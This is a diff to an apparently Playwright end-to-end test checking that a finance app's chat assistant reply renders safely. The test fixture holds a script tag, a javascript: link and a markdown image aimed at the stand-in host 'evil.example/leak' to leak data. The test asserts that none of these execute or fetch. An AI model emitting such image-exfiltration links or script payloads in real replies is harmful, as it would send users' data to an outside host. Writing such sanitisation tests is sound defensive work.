@@ -18,12 +18,16 @@ const REPLY = [
   "Review the [Dining category](https://example.com/dining).",
   "",
   "<script>window.__pwned = true</script> [bad](javascript:alert(1))",
+  "",
+  "![x](https://evil.example/leak?d=42)",
 ].join("\n");
 
 test("the assistant's reply is drawn as formatted text, and its markup is never run", async ({ page, request }) => {
   const person = await createPerson(request);
   await createAccount(request, person, { name: "SBI Savings", type: "savings", institution: "SBI" });
   await completeSetup(request, person);
+  const requested: string[] = [];
+  page.on("request", (r) => requested.push(r.url()));
   await page.route("**/chat", (route) => {
     const events = [{ type: "session", session_id: "s1" }, { type: "tool", name: "get_trend", args: {} }, { type: "text", text: REPLY }, { type: "done" }];
     return route.fulfill({
@@ -46,6 +50,8 @@ test("the assistant's reply is drawn as formatted text, and its markup is never 
   await expect(log.getByRole("link", { name: "Dining category" })).toHaveAttribute("rel", /noopener/);
   await expect(log).not.toContainText("**"); // no raw markdown left on screen
   await expect(log.locator("script")).toHaveCount(0);
+  await expect(log.locator("img")).toHaveCount(0); // an image would be fetched from another site
+  expect(requested.filter((u) => u.includes("evil.example"))).toEqual([]);
   await expect(log.locator('a[href^="javascript"]')).toHaveCount(0);
   expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();
 });
